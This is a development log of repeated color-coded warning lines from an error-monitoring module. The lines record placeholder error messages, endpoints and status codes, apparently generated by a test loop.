WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.771019Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1578'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.771068Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1579'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.771116Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1580'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.771164Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1581'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.771214Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1582'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.771262Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1583'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.771339Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1584'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.771427Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1585'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.771488Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1586'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.771540Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1587'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m587[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.771594Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1588'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m588[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.771644Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1589'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m589[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.771693Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1590'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m590[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.771741Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1591'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m591[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.771817Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1592'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m592[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.771897Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1593'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m593[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.771958Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1594'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m594[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.772010Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1595'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m595[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.772060Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1596'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m596[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.772111Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1597'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m597[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.772160Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1598'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m598[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.772210Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1599'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m599[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.772259Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1600'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.772308Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1601'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m401[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.772357Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1602'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m402[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.772407Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1603'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m403[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.772457Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1604'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m404[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.772506Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1605'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m405[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.772555Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1606'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m406[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.772603Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1607'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m407[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.772652Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1608'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m408[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.772701Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1609'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m409[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.772751Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1610'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m410[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.772801Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1611'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m411[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.772849Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1612'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m412[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.772897Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1613'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m413[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.772945Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1614'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m414[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.772994Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1615'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m415[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.773045Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1616'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m416[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.773100Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m33[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1617'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m417[0m
